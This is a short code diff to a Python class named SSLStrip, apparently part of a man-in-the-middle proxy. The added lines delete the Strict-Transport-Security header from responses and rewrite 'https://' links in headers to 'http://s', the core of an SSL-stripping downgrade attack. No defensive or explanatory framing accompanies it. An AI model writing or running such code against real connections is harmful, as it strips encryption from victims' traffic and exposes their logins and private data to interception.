@@ -8,7 +8,8 @@ class SSLStrip:
     def modify_response(self, req, headers, body):
         if headers:
             hsts = 'Strict-Transport-Security'
-            print("HLEOOOOO")
+            del headers[hsts]
             for h in headers:
                 if "https://" in headers[h]:
+                    headers[h] = headers[h].replace("https://","http://s")
                     print("stripped: ", headers[h], headers[h].replace("https://","http://s"))
